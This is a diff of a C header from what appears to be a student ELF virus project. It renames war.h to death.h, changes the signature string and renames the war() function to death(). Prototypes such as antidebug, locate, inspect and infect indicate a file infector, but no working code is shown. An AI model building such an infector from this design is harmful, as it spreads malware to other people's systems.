@@ -1,17 +1,17 @@
 /* ************************************************************************** */
 /*                                                                            */
 /*                                                        :::      ::::::::   */
-/*   war.h                                              :+:      :+:    :+:   */
+/*   death.h                                            :+:      :+:    :+:   */
 /*                                                    +:+ +:+         +:+     */
 /*   By: ddinaut <ddinaut@student.42.fr>            +#+  +:+       +#+        */
 /*                                                +#+#+#+#+#+   +#+           */
 /*   Created: 2019/03/12 18:26:41 by ddinaut           #+#    #+#             */
-/*   Updated: 2019/04/13 14:37:39 by ddinaut          ###   ########.fr       */
+/*   Updated: 2019/04/22 20:59:10 by ddinaut          ###   ########.fr       */
 /*                                                                            */
 /* ************************************************************************** */
 
-#ifndef WAR_H
-# define WAR_H
+#ifndef DEATH_H
+# define DEATH_H
 
 /* Includes */
 # include <elf.h>
@@ -58,7 +58,7 @@
 # define __PACKED__ __attribute__ ((__packed__))
 
 # define VERSION	"1.0"
-# define CREATED_BY	"War version "VERSION" (c)oded by Jle-Quel & DjeDt"
+# define CREATED_BY	"DTH version "VERSION" (c)oded by Jle-Quel & DjeDt"
 # define CREATE_SZ	43
 
 /* Structures */
@@ -132,7 +132,7 @@ typedef struct	s_data
 void			start(void);
 void			antidebug(t_data *data);
 void			opening(t_data *data);
-void			war(t_data *data);
+void			death(t_data *data);
 void			locate(t_data *data, t_directory *dir);
 void			inspect(t_data *data, char *path);
 void			infect(t_data *data);
